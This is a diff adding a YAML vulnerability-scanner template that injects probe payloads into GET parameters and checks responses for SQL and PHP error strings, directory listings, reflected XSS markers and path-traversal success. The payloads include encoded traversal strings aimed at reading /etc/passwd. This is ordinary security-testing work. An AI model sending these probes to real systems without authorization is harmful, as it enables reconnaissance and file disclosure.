@@ -1,0 +1,141 @@
+id: errors-and-vulns
+name: Error Messages and Vulnerability Indicators
+version: 1.0
+author: GochaOqradze
+severity: medium
+description: >
+  Comprehensive multi-vector detection template that injects various payloads
+  (SQLi, LFI, XSS, SSTI, CRLF, command injection) and checks for error
+  messages, stack traces, and vulnerability indicators in responses.
+  Based on error patterns from the FuzzDB project.
+
+tags:
+  - errors
+  - information-disclosure
+  - multi-vector
+  - fingerprinting
+
+references:
+  - https://github.com/fuzzdb-project/fuzzdb/blob/master/regex/errors.txt
+
+requests:
+  - method: GET
+    path:
+      - "/search?q={{payload}}"
+      - "/page?id={{payload}}"
+      - "/view?file={{payload}}"
+
+    redirects: true
+
+    attack: batteringram
+    payloads:
+      payload:
+        - "'"
+        - '"'
+        - "`"
+        - "%"
+        - "%00"
+        - "abc.txt"
+        - "select 1--xss<xssHere>aaa"
+        - "'-confirm`1`-'"
+        - '"-confirm`1`-"'
+        - "../../../../../../../../../etc/passwd"
+        - ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd"
+        - "..%252F..%252F..%252F..%252Fetc%252fpasswd"
+        - "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+
+    matchers-condition: or
+    matchers:
+      # LFI success
+      - type: word
+        words:
+          - "root:x"
+          - "/bin/bash"
+        condition: or
+
+      # XSS reflection
+      - type: word
+        words:
+          - "<xssHere>"
+
+      # SQL Errors
+      - type: word
+        words:
+          - "SQL syntax error"
+          - "You have an error in your SQL syntax"
+          - "mysql error"
+          - "MySQL Error"
+          - "MySQL ODBC"
+          - "MySQL Driver"
+          - "mySQL error with query"
+          - "ODBC SQL Server"
+          - "ODBC Driver"
+          - "ODBC Error"
+          - "ODBC Microsoft Access"
+          - "ODBC Oracle"
+          - "Oracle Error"
+          - "Oracle Driver"
+          - "ORA-0"
+          - "ORA-1"
+          - "DB2 Error"
+          - "DB2 Driver"
+          - "CLI Driver"
+          - "JDBC Driver"
+          - "JDBC Error"
+          - "JDBC MySQL"
+          - "JDBC Oracle"
+          - "JDBC SQL"
+          - "PostgreSQL query failed: ERROR: parser: parse error"
+          - "SQLException"
+          - "SQL command not properly ended"
+          - "Syntax error in query expression"
+          - "Incorrect syntax near"
+          - "Unclosed quotation mark before the character string"
+          - "unexpected end of SQL command"
+          - "Unterminated string constant"
+        condition: or
+
+      # Application errors
+      - type: word
+        words:
+          - "Fatal error"
+          - "PHP Error"
+          - "PHP Parse error"
+          - "PHP Warning"
+          - "Warning: Cannot modify header information"
+          - "Warning: mysql_query"
+          - "Warning: pg_connect"
+          - "Warning: Supplied argument is not a valid File-Handle resource in"
+          - "ASP.NET is configured to show verbose error messages"
+          - "ASP.NET_SessionId"
+          - "Active Server Pages error"
+          - "Microsoft VBScript error"
+          - "Microsoft VBScript compilation error"
+          - "Error Diagnostic Information"
+          - "Error Report"
+          - "Internal Server Error"
+          - "server object error"
+          - "database error"
+          - "include_path"
+          - "on line"
+          - "Died at"
+          - "Type mismatch"
+          - "Invalid Path Character"
+          - "data source="
+          - "OLE/DB provider returned message"
+          - "Error converting data type varchar to numeric"
+        condition: or
+
+      # Directory listing
+      - type: word
+        words:
+          - "Index of"
+          - "Parent Directory"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: error_detail
+        regex:
+          - "((?:Fatal error|Warning|Error)[^<\\n]{10,100})"
+        group: 1
